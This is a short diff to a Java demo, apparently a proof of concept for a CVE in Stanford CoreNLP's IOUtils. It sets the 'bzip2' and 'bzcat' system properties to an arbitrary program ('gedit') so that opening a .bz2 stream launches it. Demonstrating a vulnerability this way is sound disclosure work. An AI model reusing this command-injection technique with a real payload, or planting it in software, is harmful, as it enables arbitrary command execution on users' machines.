@@ -1,8 +1,15 @@
 package cve.example;
 import edu.stanford.nlp.io.IOUtils;
+
 public class Main {
     public static void main(String[] args) {
-        demoOutput();
+        System.setProperty("bzip2", "gedit");
+        try {
+            IOUtils.getFileOutputStream("Main.bz2");
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+
     }
     public static void demoInput() {
         System.setProperty("bzcat", "gedit");
